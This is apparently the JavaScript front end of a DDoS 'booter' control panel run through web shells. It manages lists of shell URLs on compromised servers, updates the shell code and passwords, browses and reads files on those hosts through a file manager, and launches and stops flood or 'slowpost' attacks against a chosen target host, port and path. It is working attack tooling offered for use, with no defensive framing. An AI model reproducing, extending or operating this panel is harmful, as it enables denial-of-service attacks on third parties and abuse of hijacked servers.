$(document).ready(function () {	var jqXHR;	$("#usual1 ul").idTabs();	$('#login_button').click(function () {		var login_username = $('input[name="login_username"]').val();		var login_password = $('input[name="login_password"]').val();		if (login_username == "" || login_password == "") {			$('#form_gambar_warning').fadeIn('fast');			$('#form_all_null').fadeIn('fast');		} else {			var check_login = function () {				var tmp = null;				$.ajax({					'async': false,					'type': "POST",					'global': false,					'dataType': 'html',					'url': "ajax.php?check_login",					'data': {						'username': login_username,						'password': login_password					},					'success': function (data) {						tmp = data;					}				});				return tmp;			}();			if (check_login != "OK") {				$('#form_gambar_warning').fadeIn('fast').delay('4000').fadeOut('fast');				$('#wrong_credential').fadeIn('fast').delay('4000').fadeOut('fast');			} else {				$('.login_main').fadeOut('slow');				var url_home = basename(document.URL);				url_home = url_home.split("?")[0];				location.href = url_home;			}		}	});		$('#change_user_button').click(function () {		var username = $('input[name="change_pass_username"]').val();		var old_pass = $('input[name="change_old_pass"]').val();		var new_pass = $('input[name="change_new_pass"]').val();				var return_result_ch = function () {			var tmp = null;			$.ajax({				'async': false,				'type': "POST",				'global': false,				'dataType': 'html',				'url': "ajax.php?change_pass",				'data': {					'username': username,					'old_pass': old_pass,					'new_pass': new_pass				},				'success': function (data) {					tmp = data;				}			});			return tmp;		}();				if(return_result_ch == "NOT EXIST"){			$('#user_not_exist').fadeIn(1000).delay(5000).fadeOut(1000);		}else if(return_result_ch == "WRONG OLD PASS"){			$('#wrong_old').fadeIn(1000).delay(5000).fadeOut(1000);		}else if(return_result_ch == "NOT OK"){			$('#something_wrong').fadeIn(1000).delay(5000).fadeOut(1000);		}else{			$('#success_change').fadeIn(1000).delay(5000).fadeOut(1000);		}	});	$('#add_booter_button').click(function () {		var value_box = $('.text_input').val();		$.post("ajax.php?add_booter", {				"url": value_box		}).done(function (data) {			if (data == 1) {				$('#true_add').fadeIn(1000).delay(5000).fadeOut(1000);			} else if (data == 0) {				$('#false_add').fadeIn(1000).delay(5000).fadeOut(1000);			} else {				$('#exist_add').fadeIn(1000).delay(5000).fadeOut(1000);			}		});	});		$('#add_user_button').click(function () {		var username = $('input[name="add_username"]').val();		var pass = $('input[name="add_password"]').val();		var pass_re = $('input[name="add_password_retype"]').val();				var regex_user = /^[a-z0-9_-]{3,15}$/;				if(username == "" || pass == "" || pass_re == ""){			$('#form_all_null_opt').fadeIn('slow').delay(3000).fadeOut('slow');		}else if(pass != pass_re){			$('#wrong_retype_opt').fadeIn('slow').delay(3000).fadeOut('slow');		}else if(!regex_user.test(username)){			$('#regex_error').fadeIn('slow').delay(3000).fadeOut('slow');		}else{			var return_result = function () {				var tmp = null;				$.ajax({					'async': false,					'type': "POST",					'global': false,					'dataType': 'html',					'url': "ajax.php?add_user",					'data': {						'new_username': username,						'new_password': pass					},					'success': function (data) {						tmp = data;					}				});				return tmp;			}();			if(return_result == "OK"){				$('#add_user_success').fadeIn('slow').delay(3000).fadeOut('slow');				}else if(return_result == "EXIST"){				$('#already_exist').fadeIn('slow').delay(3000).fadeOut('slow');				}else{				$('#error').fadeIn('slow').delay(3000).fadeOut('slow');			}		}	});		$('#update-shell-button').click(function () {		var shell_new = $('#update_shell').val();		var return_update = function () {			var tmp = null;			$.ajax({				'async': false,				'type': "POST",				'global': false,				'dataType': 'html',				'url': "ajax.php?update-shell",				'data': {					'update_data': shell_new				},				'success': function (data) {					tmp = data;				}			});			return tmp;		}();		if(return_update == "OK"){			$('#update_shell_success').fadeIn('slow').delay(3000).fadeOut('slow');		}	});		$('#submit_s_pass').click(function () {		var new_pass = $('input[name="new_s_pass"]').val();		if(new_pass == ""){			$('#form_all_null_opt').fadeIn('slow').delay(3000).fadeOut('slow');		}else{			var return_update_p = function () {				var tmp = null;				$.ajax({					'async': false,					'type': "POST",					'global': false,					'dataType': 'html',					'url': "ajax.php?update_s_pass",					'data': {						'pass': new_pass					},					'success': function (data) {						tmp = data;					}				});				return tmp;			}();						if(return_update_p == "OK"){				$('#update_shell_p_success').fadeIn('slow').delay(3000).fadeOut('slow');			}else{				$('#error').fadeIn('slow').delay(3000).fadeOut('slow');			}		}	});	$('.home').click(function () {		var url_home = basename(document.URL);		url_home = url_home.split("?")[0];		location.href = url_home;	});		$('#server-info').click(function () {		$('#server_fileman').hide();		$('#server_info_table').fadeIn(2000);	});		$('#file-man').click(function () {		$('#server_info_table').hide();		$('#server_fileman').fadeIn(2000);	});			$('#dir_button').click(function () {		var dir = $('#input_dir').val();		var url = $('input[name="shell_url"]').val();				var return_files = (function () {			var json = null;			$.ajax({				'async': false,				'global': false,				'type': "POST",				'url': "ajax.php?fileman",				'dataType': "json",				'data': {					'loc': dir,					'url': url				}, 				'success': function (data) {					json = data;				}			});			return json;		})();				$('#input_dir').attr('value', return_files['path']);		$("#fileman-table").find("tr:gt(1)").remove();				var return_split_dir = (function () {			var json = null;			$.ajax({				'async': false,				'global': false,				'type': "POST",				'url': "ajax.php?split_dir",				'dataType': "json",				'data': {					'dir': return_files['path'],					'type': return_files['type'],				}, 				'success': function (data) {					json = data;				}			});			return json;		})();				$('#fileman-table').append("\		<tr>\				<td colspan='4' height='50'>--> \				</td>\		</tr>\		");				var dir_q = '';		$.each(return_split_dir, function(key, split_dir) {			$('#fileman-table tr:gt(1) td:first').append("<a href=\"javaScript:open_file('" + dir_q + split_dir + "');\">" + split_dir + "</a>");			dir_q = dir_q + split_dir;		});				if(return_files['type'] == 'FOLDER'){						var dir_t = dir.charAt(dir.length-1);			if(dir_t != "/"){				dir = dir + "/";			}						$('#fileman-table').append("\			<tr>\					<th style='text-align:center;'>\						Name\					</th>\					<th style='text-align:center;'>\						FileSize\					</th>\					<th style='text-align:center;'>\						Permission\					</th>\					<th style='text-align:center;'>\						Last Modified\					</th>\				</tr>\			");			$.each(return_files['data']['folder'], function(hfolder, harray) {				if(hfolder == ".."){					var return_t = "Back";					var pic = "back";					var click = return_dir(dir);				}else{					var return_t = hfolder;					var pic = "folder";					var click = dir + hfolder + "/";				}								var return_permission_fol = function () {					var tmp = null;					$.ajax({						'async': false,						'type': "POST",						'global': false,						'dataType': 'html',						'url': "ajax.php?permission",						'data': {							'data': harray['permission']						},						'success': function (data) {							tmp = data;						}					});					return tmp;				}();							$('#fileman-table').append("\				<tr>\					<td>\						<a href=\"javaScript:open_file('" + click + "');\"><img src='./images/ext/" + pic + ".png' /> " + return_t + "\					</td></a>\					<td style='text-align:center;'>\						Dir\					</td>\					<td style='text-align:center;'>\						" + return_permission_fol + "\					</td>\					<td style='text-align:center;'>\						" + harray['last_modified'] + "\					</td>\				</tr>\				");			});									$.each(return_files['data']['files'], function(hfiles, harray) {				var return_ext = function () {					var tmp = null;					$.ajax({						'async': false,						'type': "POST",						'global': false,						'dataType': 'html',						'url': "ajax.php?check_ext",						'data': {							'filename': hfiles						},						'success': function (data) {							tmp = data;						}					});					return tmp;				}();				var return_size = function () {					var tmp = null;					$.ajax({						'async': false,						'type': "POST",						'global': false,						'dataType': 'html',						'url': "ajax.php?human_filesize",						'data': {							'byte': harray['filesize']						},						'success': function (data) {							tmp = data;						}					});					return tmp;				}();				var return_permission = function () {					var tmp = null;					$.ajax({						'async': false,						'type': "POST",						'global': false,						'dataType': 'html',						'url': "ajax.php?permission",						'data': {							'data': harray['permission']						},						'success': function (data) {							tmp = data;						}					});					return tmp;				}();				$('#fileman-table').append("\				<tr>\					<td>\						<a href=\"javaScript:open_file('" + dir + hfiles + "');\"><img src='./images/ext/" + return_ext + ".png' /> " + hfiles + "\					</td></a>\					<td style='text-align:center;'>\						" + return_size + "\					</td>\					<td style='text-align:center;'>\						" + return_permission + "\					</td>\					<td style='text-align:center;'>\						" + harray['last_modified'] + "\					</td>\				</tr>\				");			});		}else{			if(return_files['data'] == "TOO BIG"){				var print = "<td colspan='4' style='text-align:center;'><h4>This file is to big !</h4></td>";			}else{				var return_decode = function () {					var tmp = null;					$.ajax({						'async': false,						'type': "POST",						'global': false,						'dataType': 'html',						'url': "ajax.php?files_decode",						'data': {							'data': return_files['data']						},						'success': function (data) {							tmp = data;						}					});					return tmp;				}();				var print = "<td colspan='4'><div class='viewfile' style='font-size:small;color:#F9F9F9;' >" + return_decode + "</div></td>";			}						var return_permission_fil = function () {				var tmp = null;				$.ajax({					'async': false,					'type': "POST",					'global': false,					'dataType': 'html',					'url': "ajax.php?permission",					'data': {						'data': return_files['info']['permission']					},					'success': function (data) {						tmp = data;					}				});				return tmp;			}();						var return_size_fil = function () {				var tmp = null;				$.ajax({					'async': false,					'type': "POST",					'global': false,					'dataType': 'html',					'url': "ajax.php?human_filesize",					'data': {						'byte': return_files['info']['filesize']					},					'success': function (data) {						tmp = data;					}				});				return tmp;			}();						$('#fileman-table').append("\			<tr>\				<th colspan='4' style='text-align:center;'>File Information</th>\			</tr>\			<tr class='noborder'>\				<td>Path</td>\				<td>" + return_files['path'] + "</td>\			</tr>\			<tr class='noborder'>\				<td>Filesize</td>\				<td>" + return_size_fil + "</td>\			</tr>\			<tr class='noborder'>\				<td>MD5</td>\				<td>" + return_files['info']['md5'] + "</td>\			</tr>\			<tr class='noborder'>\				<td>Permission</td>\				<td>" + return_permission_fil + "</td>\			</tr>\			<tr class='noborder'>\				<td width='10%'>Last Modified</td>\				<td>" + return_files['info']['last_modified'] + "</td>\			</tr>\			<tr>\				<th colspan='4' style='text-align:center;'> File Content </th>\			</tr>\			<tr>\				" + print + "\			</tr>\			");		}	});	$('#attack_button').click(function () {		var url_target = $('input[name="target"]').val();		var uri = new Uri(url_target);		url_target = uri.host();		var port_target = $('input[name="port"]').val();		var path_target = $('input[name="path"]').val();		var method_target = $('input[name=method]:radio:checked').val();		var arrange_url = "http://" + url_target + ":" + port_target + path_target;		if (url_target == "" || port_target == "") {			$('#alert_attack_form_gambar').fadeIn('fast').delay(3000).fadeOut('fast');				$('#alert_attack_form_fill').fadeIn('fast').delay(3000).fadeOut('fast');			} else {			$('#attack_table').fadeOut('fast').delay(3000).fadeOut('fast');				$('#when_attack').fadeIn('fast').delay(3000).fadeOut('fast');				var json = (function () {				var json = null;				$.ajax({					'async': false,					'global': false,					'url': "ajax.php?check_bot",					'dataType': "json",					'success': function (data) {						json = data;					}				});				return json;			})();			$.each(json, function (key, val) {					$('#running_attack_table').append('<tr><td class="boot_' + (key++) + '" id="list_boot" ><a href=\'' + val + '\'>' + val + '</a></td><td><img class="bootimg_' + (key++) + '" src="images/green_circle.png" width=\"25\" height=\"25\" /></td></tr>');				});			var return_first = function () {				var tmp = null;				$.ajax({					'async': false,					'type': "POST",					'global': false,					'dataType': 'html',					'url': "ajax.php?attack_first",					'data': {						'request': "",						'target': arrange_url,						'method': method_target					},					'success': function (data) {						tmp = data;					}				});				return tmp;			}();									if (return_first != "OK") {				$('#when_attack').fadeOut('fast');				$('#attack_failed').fadeIn('fast');			}			$(function () {				setInterval(function () {					jqXHR = $.ajax({						type: "GET",						url: "ajax.php?check_attack",						success: function (html) {							$.each(html, function (key, val) {								if (val != "ON") {									$('.bootimg_' + key).attr('src', 'red_circle.png');								}							});						}					});				}, 10000);			});		}	});	$('input[name="port"]').focusout(function () {		if ($(this).val() != "") {			var get_port_data = parseInt($(this).val());			if ((get_port_data % 1) !== 0) {				$('#alert_attack_form_gambar').fadeIn('slow').delay(2000).fadeOut('slow');				$('#alert_attack_form_notint').fadeIn('slow').delay(2000).fadeOut('slow');			} else if (get_port_data > 65535 || get_port_data <= 0) {				$('#alert_attack_form_gambar').fadeIn('slow').delay(2000).fadeOut('slow');				$('#alert_attack_form_port').fadeIn('slow').delay(2000).fadeOut('slow');			}		}	});	$('#stop_button').click(function () {		jqXHR.abort();		var stop_booter = function () {			var tmp = null;			$.ajax({				'async': false,				'type': "GET",				'global': false,				'dataType': 'html',				'url': "ajax.php?stop_attack",				'success': function (data) {					tmp = data;				}			});			return tmp;		}();		$('#when_attack').fadeOut('fast');		if (stop_booter == "OK") {			$('#attack_stop').fadeIn('fast');		} else {			$('#attack_failed').fadeIn('fast');		}	});	$(".cbutton").fadeTo('fast', 0.75);	$(':radio').click(function () {		if ($('input[name=method]:radio:checked').val() == "slowpost") {			$('input[name="port"]').attr('readonly', true);			$('input[name="path"]').attr('value', '/');			$('#pathAttack').fadeIn('fast');		} else {			$('input[name="port"]').attr('readonly', false);			$('#pathAttack').fadeOut('fast');			$('input[name="path"]').attr('value', '');		}	});	$(".cbutton").hover(function () {		$(this).fadeTo('fast', 20);	}, function () {		$(this).fadeTo('fast', 0.75);	});	$('.index').fadeIn(2000);	$('.usual').fadeIn(2000);	$('#attack_table').fadeIn(2000);	$('#add_booter_form').fadeIn(2000);	$('#list_booter_table').fadeIn(2000);	});function open_file(file){	$('#input_dir').prop('value', file);	$("#dir_button").click();}function return_dir(dir){	var need_rem = dir.split('/');	need_rem = need_rem[need_rem.length - 2];	dir = dir.replace(need_rem + "/", "");	return dir;}